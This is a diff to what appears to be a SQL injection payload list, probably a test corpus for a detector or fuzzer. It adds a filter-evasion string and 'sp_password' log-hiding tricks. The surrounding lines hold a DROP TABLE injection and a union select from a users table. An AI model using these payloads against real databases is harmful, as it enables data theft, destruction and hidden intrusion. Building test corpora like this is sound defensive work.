@@ -393,3 +393,10 @@ x' AND 1=0; DROP TABLE TMP_DB;
 # https://twitter.com/st1ll_di3/status/344416764949561346
 # http://pastebin.com/Ymcs7nE0
 (--- 0)'=(currenT_user()-3) union select 1,2,3 from users; -- -
+
+# example from http://www.websec.ca/kb/sql_injection
+1=1 AND-+-+-+-+~~((1))
+
+# the bizarre sp_password hackery
+1-- foo sp_password
+1'--sp_password
